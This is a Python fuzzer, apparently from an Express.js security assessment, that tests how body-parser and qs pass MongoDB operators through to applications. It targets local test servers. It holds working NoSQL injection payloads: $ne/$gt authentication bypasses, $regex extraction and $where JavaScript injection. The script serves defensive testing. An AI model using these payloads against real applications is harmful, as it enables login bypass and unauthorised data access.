#!/usr/bin/env python3
"""
Phase 2.6 — NoSQL Injection Fuzzer
Express.js Security Assessment — [REDACTED]

Tests how Express/qs handles MongoDB-style operators in query params.
SCOPE: Framework query parser behavior (qs object nesting).
"""

import requests
import json
import os
from datetime import datetime

TARGETS = {'v5': 'http://127.0.0.1:3000', 'v4': 'http://127.0.0.1:3001'}
EVIDENCE_DIR = '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/evidence'

results = {
    'metadata': {'phase': '2.6', 'name': 'NoSQL Injection Fuzzer', 'timestamp': datetime.now().isoformat(),
                 'scope': 'Framework query parsing — operator injection via qs'},
    'tests': [], 'findings': [], 'anomalies': [], 'summary': {}
}
test_count = 0
anomaly_count = 0

def log_test(name, ver, data, finding=None, anomaly=None):
    global test_count, anomaly_count
    test_count += 1
    results['tests'].append({'id': test_count, 'test': name, 'version': ver, 'data': data})
    if finding:
        results['findings'].append({'id': len(results['findings'])+1, **finding, 'version': ver})
        print(f"  [{test_count:3d}] ⚠ {name} ({ver})")
    elif anomaly:
        anomaly_count += 1
        results['anomalies'].append({'id': anomaly_count, **anomaly, 'version': ver})
        print(f"  [{test_count:3d}] ? {name} ({ver})")
    else:
        print(f"  [{test_count:3d}] ✓ {name} ({ver})")


def fuzz_nosql_via_json():
    """Test NoSQL injection via JSON body"""
    print("\n[*] Fuzzing NoSQL injection via JSON body...")

    payloads = [
        ('auth_bypass_ne', {'filter': {'username': {'$ne': ''}, 'password': {'$ne': ''}}}),
        ('auth_bypass_gt', {'filter': {'username': {'$gt': ''}, 'password': {'$gt': ''}}}),
        ('regex_extract', {'filter': {'username': {'$regex': '^admin'}}}),
        ('regex_wildcard', {'filter': {'username': {'$regex': '.*', '$options': 'i'}}}),
        ('where_injection', {'filter': {'username': {'$where': 'this.role === "admin"'}}}),
        ('where_rce', {'filter': {'username': {'$where': 'function(){return true}'}}}),
        ('in_operator', {'filter': {'role': {'$in': ['admin', 'user']}}}),
        ('not_equal_all', {'filter': {'id': {'$ne': -1}}}),
        ('gt_lt_range', {'filter': {'id': {'$gt': 0, '$lt': 100}}}),
        ('nested_operators', {'filter': {'username': {'$regex': '.*', '$ne': 'nonexistent'}}}),
    ]

    for ver, base in TARGETS.items():
        requests.get(f'{base}/seed', timeout=5)
        for name, payload in payloads:
            try:
                r = requests.post(f'{base}/nosql/query', json=payload, timeout=5)
                data = r.json() if r.status_code == 200 else {}
                count = data.get('count', 0)

                finding = None
                # Check if $where operator was evaluated (framework passes through, app evaluates)
                if '$where' in str(payload) and count > 0:
                    finding = {
                        'title': f'NoSQL $where Operator Injection ({name})',
                        'severity': 'INFO',
                        'cwe': 'CWE-943',
                        'description': f'body-parser passed $where operator through. App-level eval occurred. '
                                       f'Returned {count} results.',
                        'framework_behavior': False,
                        'note': 'body-parser does not filter MongoDB operators from JSON — by design'
                    }

                log_test(f'nosql_json_{name}', ver, {
                    'payload': str(payload)[:200], 'status': r.status_code,
                    'count': count, 'results': str(data.get('results', []))[:200]
                }, finding)
            except Exception as e:
                log_test(f'nosql_json_{name}', ver, {'error': str(e)})


def fuzz_nosql_via_query():
    """Test how qs converts query params to objects — FRAMEWORK BEHAVIOR"""
    print("\n[*] Testing qs object conversion (NoSQL operator injection surface)...")

    # qs converts bracket notation to objects — this is the framework-level concern
    qs_payloads = [
        ('basic_ne', 'username[$ne]=&password[$ne]='),
        ('basic_gt', 'username[$gt]=&password[$gt]='),
        ('regex_op', 'username[$regex]=.*'),
        ('in_array', 'role[$in][0]=admin&role[$in][1]=user'),
        ('nested_op', 'filter[username][$ne]='),
        ('deep_nesting', 'a[$ne][b][$gt]=1'),
        ('dollar_prefix', '$where=true'),
        ('mixed', 'username=admin&role[$ne]=user'),
    ]

    for ver, base in TARGETS.items():
        for name, qs in qs_payloads:
            try:
                r = requests.get(f'{base}/method-test?{qs}', timeout=5)
                data = r.json() if r.status_code == 200 else {}
                parsed = data.get('query', {})

                finding = None
                # Check if qs created nested objects from bracket notation
                if isinstance(parsed.get('username'), dict) or isinstance(parsed.get('password'), dict):
                    finding = {
                        'title': f'qs Creates Objects from Query Params ({name})',
                        'severity': 'MEDIUM',
                        'cwe': 'CWE-943',
                        'description': f'qs module converts bracket notation to objects: {json.dumps(parsed)[:200]}. '
                                       f'This enables NoSQL operator injection when apps pass query params to DB queries.',
                        'framework_behavior': True,
                        'note': 'qs object creation is by design, but creates NoSQL injection surface'
                    }

                log_test(f'nosql_qs_{name}', ver, {
                    'query_string': qs, 'parsed': str(parsed)[:300],
                    'types': {k: type(v).__name__ for k, v in parsed.items()}
                }, finding)
            except Exception as e:
                log_test(f'nosql_qs_{name}', ver, {'error': str(e)})


def main():
    print("=" * 70)
    print("Phase 2.6 — NoSQL Injection Fuzzer")
    print("=" * 70)

    fuzz_nosql_via_json()
    fuzz_nosql_via_query()

    results['summary'] = {'total_tests': test_count, 'findings_count': len(results['findings']), 'anomalies_count': anomaly_count}
    out_file = os.path.join(EVIDENCE_DIR, 'nosql_fuzzer_results.json')
    with open(out_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\nNoSQL fuzzer complete: {test_count} tests, {len(results['findings'])} findings, {anomaly_count} anomalies")
    print(f"Evidence: {out_file}")

if __name__ == '__main__':
    main()
